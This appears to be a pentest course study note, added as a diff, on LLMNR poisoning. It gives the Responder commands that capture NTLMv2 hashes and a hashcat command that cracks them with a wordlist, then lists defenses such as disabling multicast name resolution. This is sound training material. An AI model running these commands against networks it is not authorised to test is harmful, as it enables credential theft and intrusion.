@@ -1,0 +1,30 @@
+# LLMNR Poisoning Overview
+
+- Most commonly used attack in internal pentest
+- used to identify hosts when DNS fails to do so
+- the services use the user’s username and hash (NTLMv2) (MITM Attack)
+- basically based on mistakes when someone mistypes a file name and the MITM intercepts traffic
+- Step 1: Run Responder
+    - sudo responder -I tun0 -dP (on VPN) (-i for interface)
+        - sudo responder -I eth0 -dP (on local)
+        - this is used to respond to traffic
+        - best to run while there is a lot of traffic
+        - start it and let it listen
+        - when it has traffic it’ll retrieve the hash
+        - In the lab scenario, we simulated traffic by typing \\<attacker ip> into the file search
+    - To edit the Responder.conf file, navigate to /etc/responder/Responder.conf
+    - must sudo to edit
+
+Crack the Hash
+
+- hashcat —help | grep <choice> (NTLM)
+- hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+
+
+# LMNR Poisoning Mitigation
+
+- Best defense is disabling LLMNR/NBT-NS using group policy
+    - There is a default admin template called turn off multicast name resolution
+- If not possible to turn off, best to require Network Access Control
+    - must be allowed to join network (like certain MAC Addresses
+    - Strong passwords help prevent as well
